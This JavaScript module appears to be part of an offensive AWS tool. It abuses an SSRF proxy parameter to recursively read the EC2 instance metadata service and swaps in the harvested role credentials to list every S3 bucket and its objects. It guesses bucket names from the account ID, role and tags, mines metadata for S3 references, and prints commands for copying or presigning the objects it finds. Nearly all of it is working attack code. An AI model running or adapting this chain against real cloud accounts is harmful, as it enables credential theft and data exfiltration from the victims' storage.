import { executeAWSCommand } from "./aws.js";
import { CONFIG } from "./config.js";
import axios from "axios";
import {
  logInfo,
  logSuccess,
  logError,
  logWarning,
  logSeparator,
  log,
} from "./utils.js";

export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/latest/meta-data/") {
  const discoveredPaths = {};

  try {
    const metadataUrl = `${CONFIG.imdsv2.baseUrl}${basePath}`;
    const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${encodeURIComponent(metadataUrl)}`;

    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
      timeout: 5000,
    });

    if (response.data) {
      const content = typeof response.data === "string" ? response.data : JSON.stringify(response.data);

      if (content.includes("\n")) {
        const paths = content.split("\n").filter(p => p.length > 0);

        for (const path of paths) {
          const fullPath = basePath + path;

          if (path.includes("public-keys")) continue;

          try {
            if (path.endsWith("/")) {
              if (basePath.split("/").length < 6) {
                const subPaths = await enumerateIMDSRecursive(proxyUrl, token, fullPath);
                Object.assign(discoveredPaths, subPaths);
              }
            } else {
              const itemUrl = `${CONFIG.imdsv2.baseUrl}${fullPath}`;
              const itemFullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${encodeURIComponent(itemUrl)}`;

              const itemResponse = await axios.get(itemFullUrl, {
                headers: {
                  [CONFIG.imdsv2.headers.tokenRequest]: token,
                },
                timeout: 5000,
              });

              if (itemResponse.data) {
                discoveredPaths[fullPath] = typeof itemResponse.data === "string"
                  ? itemResponse.data
                  : JSON.stringify(itemResponse.data);
              }
            }
          } catch (error) {
            console.error(`Error enumerating path ${fullPath}:`, error.message);
          }
        }
      } else {
        discoveredPaths[basePath] = content;
      }
    }
  } catch (error) {
    console.error(`Error enumerating base path ${basePath}:`, error.message);
  }

  return discoveredPaths;
}

export async function testS3AccessWithCredentials(roleName, accessKeyId, secretAccessKey, sessionToken) {
  logInfo(`Testing S3 access for role: ${roleName}`);

  const originalAccessKey = process.env.AWS_ACCESS_KEY_ID;
  const originalSecretKey = process.env.AWS_SECRET_ACCESS_KEY;
  const originalSessionToken = process.env.AWS_SESSION_TOKEN;

  process.env.AWS_ACCESS_KEY_ID = accessKeyId;
  process.env.AWS_SECRET_ACCESS_KEY = secretAccessKey;
  process.env.AWS_SESSION_TOKEN = sessionToken;

  try {
    const result = await testS3Access(true); // Silent mode since we already logged the role name
    return result;
  } finally {
    if (originalAccessKey) process.env.AWS_ACCESS_KEY_ID = originalAccessKey;
    else delete process.env.AWS_ACCESS_KEY_ID;

    if (originalSecretKey) process.env.AWS_SECRET_ACCESS_KEY = originalSecretKey;
    else delete process.env.AWS_SECRET_ACCESS_KEY;

    if (originalSessionToken) process.env.AWS_SESSION_TOKEN = originalSessionToken;
    else delete process.env.AWS_SESSION_TOKEN;
  }
}

export async function testS3Access(silent = false) {
  const s3Results = {
    listBuckets: false,
    buckets: [],
  };

  try {
    if (!silent) log("Listing all S3 buckets...", null, "dim");
    const output = await executeAWSCommand("aws s3 ls");

    if (output && output.trim().length > 0) {
      const bucketLines = output.trim().split('\n');
      const bucketNames = bucketLines.map(line => {
        const parts = line.trim().split(/\s+/);
        return parts[parts.length - 1]; // Last part is bucket name
      }).filter(name => name && name.length > 0);

      s3Results.listBuckets = true;
      if (!silent) logSuccess(`✓ Found ${bucketNames.length} bucket(s)`);

      for (const bucketName of bucketNames) {
        if (!silent) logInfo(`Checking bucket: ${bucketName}`);

        const bucketInfo = {
          name: bucketName,
          objects: [],
        };

        try {
          let objects = null;
          try {
            const s3LsOutput = await executeAWSCommand(`aws s3 ls s3://${bucketName}/`);

            if (s3LsOutput && s3LsOutput.trim().length > 0) {
              const lines = s3LsOutput.trim().split('\n');
              objects = { Contents: [] };

              for (const line of lines) {
                const trimmed = line.trim();
                if (trimmed.startsWith('PRE ')) {
                  continue;
                }

                const parts = trimmed.split(/\s+/);
                if (parts.length >= 4) {
                  const size = parseInt(parts[2]);
                  const key = parts.slice(3).join(' ');
                  objects.Contents.push({ Key: key, Size: size });
                }
              }

              if (!silent) log(`  (using aws s3 ls method)`, null, "dim");
            }
          } catch (s3LsError) {
          }

          if (!objects) {
            const objectsOutput = await executeAWSCommand(
              `aws s3api list-objects-v2 --bucket ${bucketName} --max-keys 100 --output json`
            );
            objects = JSON.parse(objectsOutput);
            if (!silent) log(`  (using aws s3api method)`, null, "dim");
          }

          if (objects.Contents && objects.Contents.length > 0) {
            logSuccess(`  ✓ ${objects.Contents.length} object(s) found`);

            for (const obj of objects.Contents) {
              log(`    - ${obj.Key} (${obj.Size} bytes)`, null, "green");
              bucketInfo.objects.push(obj);
            }

            console.log();
            logInfo(`  To access objects:`);
            log(`    aws s3 cp s3://${bucketName}/<object-key> .`, null, "cyan");
            log(`    aws s3 presign s3://${bucketName}/<object-key> --expires-in 3600`, null, "cyan");
            console.log();
          } else {
            log(`  Empty or no access to list objects`, null, "dim");
          }
        } catch (listError) {
          if (listError.message.includes("AccessDenied")) {
            log(`  ✗ Access denied to list objects`, null, "dim");
          } else {
            log(`  ? Error listing objects`, null, "dim");
          }
        }

        s3Results.buckets.push(bucketInfo);
        logSeparator();
      }
    } else {
      logInfo("No buckets found");
    }
  } catch (error) {
    if (error.message.includes("AccessDenied")) {
      logWarning("✗ Access denied to list buckets");
    } else {
      log("✗ Cannot list buckets", null, "dim");
    }
  }

  logSeparator();
  return s3Results;
}

export async function discoverBuckets(context, foundReferences = []) {
  logInfo("Attempting to discover S3 buckets using dynamic patterns...");
  logSeparator();

  const discoveredBuckets = [];

  const accountId = context.accountId || "";
  const roleName = context.roleName || "";
  const region = context.region || "us-east-1";
  const instanceId = context.instanceId || "";
  const tags = context.tags || {};

  const patterns = [];

  if (roleName) {
    patterns.push(
      roleName,
      `${roleName}-bucket`,
      `${roleName}-data`,
      `${roleName}-backups`,
      `${roleName}-logs`,
      `${roleName}-artifacts`,
      `${roleName}-storage`
    );
  }

  if (accountId) {
    patterns.push(
      `${accountId}-bucket`,
      `${accountId}-data`,
      `${accountId}-backups`,
      `${accountId}-logs`
    );
  }

  if (tags.Name) {
    patterns.push(tags.Name, `${tags.Name}-bucket`);
  }
  if (tags.Environment) {
    patterns.push(`${tags.Environment}-bucket`, `${accountId}-${tags.Environment}`);
  }
  if (tags.Application) {
    patterns.push(tags.Application, `${tags.Application}-bucket`);
  }

  patterns.push(...foundReferences);

  const genericSuffixes = ["bucket", "data", "backups", "logs", "artifacts", "uploads", "assets", "files"];
  const genericPrefixes = ["prod", "staging", "dev", "test"];

  if (accountId) {
    genericPrefixes.forEach(prefix => {
      genericSuffixes.forEach(suffix => {
        patterns.push(`${prefix}-${accountId}-${suffix}`);
        patterns.push(`${accountId}-${prefix}-${suffix}`);
      });
    });
  }

  const uniquePatterns = [...new Set(patterns.filter(p => p && p.length > 0))];

  for (const bucketName of uniquePatterns) {
    try {
      log(`Testing bucket: ${bucketName}...`, null, "dim");

      await executeAWSCommand(`aws s3api head-bucket --bucket ${bucketName} 2>&1`);

      logSuccess(`✓ Found accessible bucket: ${bucketName}`);
      discoveredBuckets.push(bucketName);

      try {
        const objectsOutput = await executeAWSCommand(`aws s3api list-objects-v2 --bucket ${bucketName} --output json`);
        const objects = JSON.parse(objectsOutput);

        if (objects.Contents && objects.Contents.length > 0) {
          logSuccess(`  Found ${objects.Contents.length} object(s) in ${bucketName}:`);

          for (const obj of objects.Contents) {
            log(`    - ${obj.Key} (${obj.Size} bytes)`, null, "green");
          }

          console.log();
          logInfo(`  To access objects:`);
          log(`    aws s3 cp s3://${bucketName}/<object-key> .`, null, "cyan");
          log(`    aws s3 presign s3://${bucketName}/<object-key> --expires-in 3600`, null, "cyan");
          console.log();
        } else {
          log(`  Bucket is empty or cannot list objects`, null, "dim");
        }
      } catch (listError) {
        log(`  Cannot list objects in bucket (no ListObjects permission)`, null, "dim");
      }

      logSeparator();
    } catch (error) {
      if (error.message.includes("NoSuchBucket")) {
      } else if (error.message.includes("403") || error.message.includes("AccessDenied")) {
        log(`? Bucket ${bucketName} exists but access denied`, null, "yellow");
      }
    }
  }

  if (discoveredBuckets.length > 0) {
    logSuccess(`Discovered ${discoveredBuckets.length} accessible bucket(s)!`);
  } else {
    logWarning("No accessible buckets found through pattern matching");
  }

  logSeparator();
  return discoveredBuckets;
}

export function extractS3References(metadataMap) {
  const references = {
    bucketNames: new Set(),
    arns: new Set(),
    urls: new Set(),
  };

  for (const [path, content] of Object.entries(metadataMap)) {
    const arnMatches = content.match(/arn:aws:s3:::[a-z0-9.-]+[^\s]*/gi);
    if (arnMatches) {
      arnMatches.forEach(arn => {
        references.arns.add(arn);
        const bucketName = arn.replace("arn:aws:s3:::", "").split("/")[0];
        if (bucketName) references.bucketNames.add(bucketName);
      });
    }

    const urlMatches = content.match(/https?:\/\/[a-z0-9.-]*s3[a-z0-9.-]*\.amazonaws\.com[^\s]*/gi);
    if (urlMatches) {
      urlMatches.forEach(url => {
        references.urls.add(url);
        const match = url.match(/https?:\/\/([a-z0-9.-]+)\.s3/i);
        if (match) references.bucketNames.add(match[1]);
      });
    }

    const s3Protocols = content.match(/s3:\/\/([a-z0-9][a-z0-9.-]{1,61}[a-z0-9])(\/|$)/gi);
    if (s3Protocols) {
      s3Protocols.forEach(s3Url => {
        const bucketName = s3Url.replace(/s3:\/\//i, '').replace(/\/$/, '');
        if (bucketName) references.bucketNames.add(bucketName);
      });
    }

    const awsResourcePrefixes = /^(i|ami|snap|vol|sg|subnet|vpc|eni|rtb|igw|nat|vpce|eipalloc|acl)-/i;

    const bucketMatches = content.match(/\b([a-z0-9][a-z0-9-]{2,61}[a-z0-9])\b/gi);
    if (bucketMatches) {
      bucketMatches.forEach(match => {
        if (awsResourcePrefixes.test(match)) {
          return;
        }

        if (match.includes('-') &&
            match.match(/challenge|bucket|data|backup|log|artifact|storage|file|upload|asset/)) {
          references.bucketNames.add(match.toLowerCase());
        }
      });
    }
  }

  return {
    bucketNames: Array.from(references.bucketNames),
    arns: Array.from(references.arns),
    urls: Array.from(references.urls),
  };
}
